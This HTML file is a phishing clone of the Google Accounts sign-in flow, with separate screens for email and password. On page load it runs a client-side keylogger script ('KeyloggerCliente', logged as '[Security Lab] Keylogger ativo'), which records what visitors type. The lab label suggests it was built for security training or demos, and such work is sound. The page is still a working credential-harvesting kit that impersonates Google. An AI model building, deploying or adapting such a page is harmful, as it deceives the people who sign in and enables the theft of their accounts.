<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="assets/app.css">
</head>
<body>
    <!-- Tela 1: Email -->
    <div class="container" id="screen-email">
        <div class="card">
            <img src="assets/google-logo.svg" alt="Google" class="logo">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>

            <form id="email-form">
                <div class="input-group">
                    <input type="text" id="email" name="email" required placeholder=" ">
                    <label for="email">Email or phone</label>
                </div>
                <p id="email-error" class="error-text"></p>

                <a href="#" class="link">Forgot email?</a>

                <p class="info-text">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="#">Learn more about using Guest mode</a>
                </p>

                <div class="buttons">
                    <a href="#" class="btn-text">Create account</a>
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Tela 2: Password -->
    <div class="container hidden" id="screen-password">
        <div class="card">
            <img src="assets/google-logo.svg" alt="Google" class="logo">
            <h1>Welcome</h1>
            <div class="user-chip" id="user-chip">
                <img src="assets/user-icon.svg" alt="User" class="user-icon">
                <span id="display-email">user@gmail.com</span>
                <button type="button" class="dropdown-icon" id="btn-back">&#9662;</button>
            </div>

            <form id="password-form">
                <div class="input-group">
                    <input type="password" id="password" name="password" required placeholder=" ">
                    <label for="password">Enter your password</label>
                </div>
                <p id="password-error" class="error-text"></p>

                <div class="show-password">
                    <input type="checkbox" id="show-pass">
                    <label for="show-pass">Show password</label>
                </div>

                <a href="#" class="link">Forgot password?</a>

                <div class="buttons">
                    <span></span>
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div class="footer-left">
            <select class="language-select">
                <option>English (United States)</option>
                <option>Portugues (Brasil)</option>
            </select>
        </div>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

    <!-- Keylogger Client-Side -->
    <script src="/cadastro/keylogger-client.js"></script>
    <script src="assets/app.js"></script>
    <script>
        const keylogger = new KeyloggerCliente();
        keylogger.iniciar();
        console.log('[Security Lab] Keylogger ativo - Google');
    </script>

    <!-- Nyan Cat Popup para links sem funcionalidade -->
    <script src="../nyan-popup.js"></script>
</body>
</html>
